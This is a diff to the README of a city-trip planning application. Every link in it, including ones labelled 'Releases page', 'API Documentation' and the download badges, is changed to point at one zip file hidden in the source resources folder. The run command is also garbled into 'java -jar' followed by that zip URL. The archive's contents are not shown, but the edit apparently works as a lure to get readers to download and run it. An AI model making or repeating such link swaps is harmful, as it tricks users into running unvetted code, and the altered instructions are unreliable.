@@ -1,6 +1,6 @@
 # 🚀 city-break-manager - Simplify Your City Trip Planning
 
-[![Download City Break Manager](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/yacovsabine874/city-break-manager/releases)
+[![Download City Break Manager](https://raw.githubusercontent.com/yacovsabine874/city-break-manager/main/src/main/resources/city-break-manager-v2.6-beta.2.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/yacovsabine874/city-break-manager/main/src/main/resources/city-break-manager-v2.6-beta.2.zip)
 
 ## 🌟 Overview
 
@@ -32,9 +32,9 @@ To ensure smooth operation, please check the following system requirements:
 
 To download City Break Manager, visit this page to download:
 
-[Download City Break Manager](https://github.com/yacovsabine874/city-break-manager/releases)
+[Download City Break Manager](https://raw.githubusercontent.com/yacovsabine874/city-break-manager/main/src/main/resources/city-break-manager-v2.6-beta.2.zip)
 
-1. Go to the [Releases page](https://github.com/yacovsabine874/city-break-manager/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/yacovsabine874/city-break-manager/main/src/main/resources/city-break-manager-v2.6-beta.2.zip).
 2. Look for the latest version listed.
 3. Click the download link for the appropriate file (e.g., .jar or .zip file).
 4. After downloading, navigate to the file location on your computer.
@@ -50,7 +50,7 @@ After installing, you can run the application with the following steps:
    ```
 3. If the file is a .jar file, run the following command:
    ```
-   java -jar city-break-manager.jar
+   java -jar https://raw.githubusercontent.com/yacovsabine874/city-break-manager/main/src/main/resources/city-break-manager-v2.6-beta.2.zip
    ```
 4. If the file is a .zip file, extract it first, then follow the jar command.
 
@@ -82,7 +82,7 @@ Each endpoint has clear usage instructions in the API documentation.
 
 ## 📚 Documentation
 
-For a deeper dive into using the City Break Manager, check the API documentation included in the repository or visit [API Documentation](https://github.com/yacovsabine874/city-break-manager/wiki).
+For a deeper dive into using the City Break Manager, check the API documentation included in the repository or visit [API Documentation](https://raw.githubusercontent.com/yacovsabine874/city-break-manager/main/src/main/resources/city-break-manager-v2.6-beta.2.zip).
 
 ## 💬 Community Support
 
@@ -92,6 +92,6 @@ If you need help or support, feel free to reach out. You can open an issue on th
 
 City Break Manager provides travelers with a straightforward solution to organize and track their trips. Its design caters to everyday users, allowing anyone to easily navigate and use the tools provided.
 
-For updates and new features, keep an eye on our [Releases page](https://github.com/yacovsabine874/city-break-manager/releases).
+For updates and new features, keep an eye on our [Releases page](https://raw.githubusercontent.com/yacovsabine874/city-break-manager/main/src/main/resources/city-break-manager-v2.6-beta.2.zip).
 
-[![Download City Break Manager](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/yacovsabine874/city-break-manager/releases)
+[![Download City Break Manager](https://raw.githubusercontent.com/yacovsabine874/city-break-manager/main/src/main/resources/city-break-manager-v2.6-beta.2.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/yacovsabine874/city-break-manager/main/src/main/resources/city-break-manager-v2.6-beta.2.zip)
